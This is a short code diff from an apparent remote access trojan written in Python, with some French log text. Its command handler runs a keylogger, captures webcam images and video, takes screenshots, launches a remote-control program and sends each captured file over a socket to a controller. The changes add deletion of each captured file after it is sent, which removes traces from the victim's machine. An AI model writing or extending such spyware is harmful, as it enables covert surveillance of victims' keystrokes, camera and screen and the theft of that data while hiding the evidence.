@@ -59,6 +59,7 @@ def handle_commands(client_socket):
             if command == "keylogger":
                 if wait_for_file(KEYLOG_FILE):
                     send_file(client_socket, KEYLOG_FILE, "keystroke")
+                    os.remove(KEYLOG_FILE)
 
             elif command == "capture_image":
                 subprocess.run([WEBCAM_EXE, "image"], check=True)
@@ -68,6 +69,7 @@ def handle_commands(client_socket):
                     latest_image = max(images, key=os.path.getctime)
                     if wait_for_file(latest_image):
                         send_file(client_socket, latest_image, "webcam_capture")
+                        os.remove(latest_image) 
 
             elif command == "capture_video":
                 subprocess.run([WEBCAM_EXE, "video"], check=True)
@@ -77,6 +79,7 @@ def handle_commands(client_socket):
                     latest_video = max(videos, key=os.path.getctime)
                     if wait_for_file(latest_video):
                         send_file(client_socket, latest_video, "webcam_capture")
+                        os.remove(latest_video)
 
             elif command == "remote":
                 print("[*] remote.exe est lancé !")
@@ -92,6 +95,7 @@ def handle_commands(client_socket):
                     latest = max(images, key=os.path.getctime)
                     if wait_for_file(latest):
                         send_file(client_socket, latest, "screenshot")
+                        os.remove(latest)
 
 
             
